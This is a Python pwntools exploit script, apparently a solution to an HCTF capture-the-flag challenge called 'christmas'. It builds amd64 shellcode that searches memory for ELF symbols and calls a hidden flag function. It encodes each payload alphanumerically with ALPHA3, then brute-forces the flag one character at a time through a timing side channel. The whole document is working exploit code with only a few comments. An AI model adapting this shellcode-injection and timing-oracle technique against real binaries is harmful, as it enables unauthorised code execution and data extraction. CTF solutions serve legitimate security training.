from pwn import *
import time
import os
import pwnlib.shellcraft.amd64 as sc

context.arch = 'amd64'
#context.log_level = 'debug'

playload = asm(sc.mov('rax',0x602030))+\
asm('mov rbx,[rax]')+\
asm(sc.mov('rcx',0x6f690))+\
asm('sub rbx,rcx')+\
asm(sc.push(0x6FFFFEF5))+\
asm('''
    start :
        push 4
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz do
        sub rbx,1
        jnz start
    do :
        add rbx,0x18
        mov r10,[rbx]
        add rbx,0x10
        mov r11,[rbx]
        sub rdi,0x1c
        mov rcx,[rdi]
        sub rbx,0x78
        sub rbx,0x30
        sub rbx,rcx
        mov r12,rbx
    ''')+\
asm('mov rbx,r10')+\
asm(sc.pushstr('flag_yes_'))+\
asm('''
    start :
        push 9
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz do
        add rbx,1
        jnz start
    do :
        sub rbx,r10
    ''')+\
asm('mov rax,rbx')+\
asm('mov rbx,r11')+\
asm('push rax')+\
asm('''
    start :
        push 3
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz do
        add rbx,1
        jnz start
    do :
    ''')+\
asm('mov rax,rbx')+\
asm('add rax,0x8')+\
asm('mov rbx,[rax]')+\
asm('add rbx,r12')+\
asm('call rbx')

def addplayload(index,asc) :
    tmp = playload+asm('''
                        add al,%d
                        xor rbx,rbx
                        xor rcx,rcx
                        mov bl,[rax]
                        add cl,%d
                        cmp bl,cl
                        jz do
                        xor rax,rax
                        mov al,60
                        syscall
                    do :
                    '''%(index,asc))+asm(sc.infloop())
    #mov al,%d;add al,%d
    f = open('shell','wb')
    f.write(tmp)
    f.close()

def encode(index,asc) :
    addplayload(index,asc)
    a = os.popen("python ~/alpha3/ALPHA3.py x64 ascii mixedcase RAX --input='shell'")
    payload = '42'   #replace base addr
    payload += a.read()
    a.close()
    return payload

def exp(index,asc) :
    p = process('./christmas')
    payload = encode(index,asc)
    p.recvuntil('tell me how to find it??\n')
    #gdb.attach(p)
    p.sendline(payload)
    start = time.time()
    p.can_recv(timeout=3)
    end = time.time()
    p.close()
    if end - start > 2 :
        #print asc
        return True
    else :
        #p.close()
        return False

def start() :
    scaii = '{}_+=-~?";:1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    flag = 'HCTF{'
    for i in range(5,40) :
        for j in scaii :
            try :
                print '(%d,%d)'%(i,ord(j))
                if exp(i,ord(j)) :
                    print j
                    flag += j
                    print flag
                    #raw_input('')
                    if j == '}' :
                        print flag
                        exit()
            except Exception as e :
                print e

if __name__ ==  '__main__' :
    start()
